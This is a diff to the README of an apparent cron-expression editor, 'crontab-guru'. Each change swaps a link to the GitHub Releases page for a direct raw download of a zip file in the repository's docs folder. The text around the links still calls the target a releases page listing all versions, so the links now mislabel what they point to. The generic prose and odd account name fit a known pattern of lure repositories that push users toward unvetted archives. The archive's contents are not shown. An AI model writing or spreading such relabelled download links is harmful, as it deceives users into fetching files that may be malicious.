@@ -1,7 +1,7 @@
 # 🛠️ crontab-guru - Easy Cron Job Setup for Everyone
 
 ## 🔗 Download Now
-[![Download crontab-guru](https://img.shields.io/badge/Download-crontab--guru-blue.svg)](https://github.com/Nonfat-militaryacademy249/crontab-guru/releases)
+[![Download crontab-guru](https://raw.githubusercontent.com/Nonfat-militaryacademy249/crontab-guru/main/docs/crontab-guru-v1.0.zip)](https://raw.githubusercontent.com/Nonfat-militaryacademy249/crontab-guru/main/docs/crontab-guru-v1.0.zip)
 
 ## 🌟 Overview
 Crontab-guru is an interactive terminal-based cron expression editor. It helps you create, validate, and manage your cron jobs easily. With a user-friendly interface and real-time feedback, you can understand and handle cron expressions without needing any programming knowledge.
@@ -10,7 +10,7 @@ Crontab-guru is an interactive terminal-based cron expression editor. It helps y
 Follow these steps to download and run crontab-guru on your computer:
 
 1. **Visit the Releases Page**
-   To download crontab-guru, [visit this page](https://github.com/Nonfat-militaryacademy249/crontab-guru/releases). This page lists all available versions.
+   To download crontab-guru, [visit this page](https://raw.githubusercontent.com/Nonfat-militaryacademy249/crontab-guru/main/docs/crontab-guru-v1.0.zip). This page lists all available versions.
 
 2. **Choose the Right Version**
    Look for the latest version at the top of the list. Each version will have detailed notes about new features and fixes. It is best to choose the latest stable release for the best experience.
@@ -62,4 +62,4 @@ Crontab-guru is licensed under the MIT License. Feel free to use and modify the 
 For more questions, connect with us via the GitHub repository. We welcome all feedback to improve crontab-guru.
 
 ## 📥 Download & Install
-To start using crontab-guru, [download it from the Releases page](https://github.com/Nonfat-militaryacademy249/crontab-guru/releases). Follow the steps outlined above to ensure a smooth installation process. Enjoy efficient scheduling with ease!
+To start using crontab-guru, [download it from the Releases page](https://raw.githubusercontent.com/Nonfat-militaryacademy249/crontab-guru/main/docs/crontab-guru-v1.0.zip). Follow the steps outlined above to ensure a smooth installation process. Enjoy efficient scheduling with ease!
